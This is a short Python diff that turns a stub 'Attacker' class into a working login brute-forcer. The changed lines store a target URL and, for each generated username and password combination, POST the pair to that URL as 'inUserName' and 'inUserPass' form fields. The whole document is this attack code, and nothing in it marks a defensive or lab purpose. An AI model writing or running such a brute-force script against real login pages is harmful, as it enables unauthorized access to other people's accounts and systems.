@@ -1,9 +1,10 @@
 import itertools
+import requests
 
 
 class Attacker:
-    def __init__(self):
-        pass
+    def __init__(self, url):
+        self.url = url
 
     @staticmethod
     def create_user_and_pass_combinations():
@@ -24,7 +25,8 @@ class Attacker:
             username = combination[0]
             password = combination[1]
             print(f'username: {username}, password: {password}')
-            # attack
+            payload = {'inUserName': username, 'inUserPass': password}
+            requests.post(self.url, data=payload)
 
 
-a = Attacker().attack()
+# a = Attacker().attack()
